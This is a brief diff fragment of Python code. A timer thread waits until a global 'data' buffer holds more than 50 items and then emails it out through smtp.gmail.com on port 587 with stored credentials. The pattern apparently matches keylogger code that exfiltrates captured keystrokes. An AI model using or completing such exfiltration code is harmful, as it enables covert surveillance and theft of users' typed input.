@@ -41,8 +41,8 @@ class TimerClass(threading.Thread):
             global data
             if len(data)>50:
                 ts = datetime.datetime.now()
-                SERVER = gh
-                PORT = ghp
+                SERVER = "smtp.gmail.com"
+                PORT = 587
                 USER = EEMAIL
                 PASS = EPASS
                 FROM = USER
